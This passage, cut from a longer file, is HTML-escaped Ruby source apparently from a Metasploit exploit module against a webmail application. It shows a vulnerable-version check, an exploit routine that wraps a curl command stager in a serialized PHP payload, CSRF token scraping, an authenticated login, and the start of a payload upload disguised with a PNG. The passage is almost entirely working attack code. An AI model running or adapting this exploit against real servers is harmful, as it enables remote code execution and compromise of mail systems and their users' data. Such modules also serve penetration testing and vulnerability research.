lnerable_versions.include?(version) return CheckCode::Appears end CheckCode::Safe end def exploit stager = generate_cmdstager(flavor: :curl, &#x27;Path&#x27; =&gt; &#x27;/&#x27;).join(&#x27;;&#x27;) payload_serialized = PhpPayloadBuilder.new(stager).build.gsub(&#x27;&quot;&#x27;, &#x27;\&quot;&#x27;) token = fetch_csrf_token login(token) print_status(&#x27;Uploading malicious payload...&#x27;) upload_payload(payload_serialized) print_good(&#x27;Exploit attempt complete. Check for session.&#x27;) end def fetch_csrf_token print_status(&#x27;Fetching CSRF token...&#x27;) res = fetch_login_page unless res.body =~ /name=&quot;_token&quot; value=&quot;([^&quot;]+)&quot;/ fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Unable to extract CSRF token&quot;) end token = Regexp.last_match(1) vprint_good(&quot;Extracted token: #&#123;token&#125;&quot;) token end def login(token) print_status(&#x27;Attempting login...&#x27;) res = send_request_cgi( &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path), &#x27;method&#x27; =&gt; &#x27;POST&#x27;, &#x27;keep_cookies&#x27; =&gt; true, &#x27;vars_post&#x27; =&gt; &#123; &#x27;_token&#x27; =&gt; token, &#x27;_task&#x27; =&gt; &#x27;login&#x27;, &#x27;_action&#x27; =&gt; &#x27;login&#x27;, &#x27;_url&#x27; =&gt; &#x27;_task=login&#x27;, &#x27;_user&#x27; =&gt; datastore[&#x27;USERNAME&#x27;], &#x27;_pass&#x27; =&gt; datastore[&#x27;PASSWORD&#x27;] &#125;, &#x27;vars_get&#x27; =&gt; &#123; &#x27;_task&#x27; =&gt; &#x27;login&#x27; &#125; ) fail_with(Failure::Unreachable, &quot;#&#123;peer&#125; - No response during login&quot;) unless res fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Login failed (code #&#123;res.code&#125;)&quot;) unless res.code == 302 print_good(&#x27;Login successful.&#x27;) end def upload_payload(payload_filename) png_data = Rex::Text.decode_base64(&#x27;iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==&#x27;) boundary = Rex::Text.rand_text_alph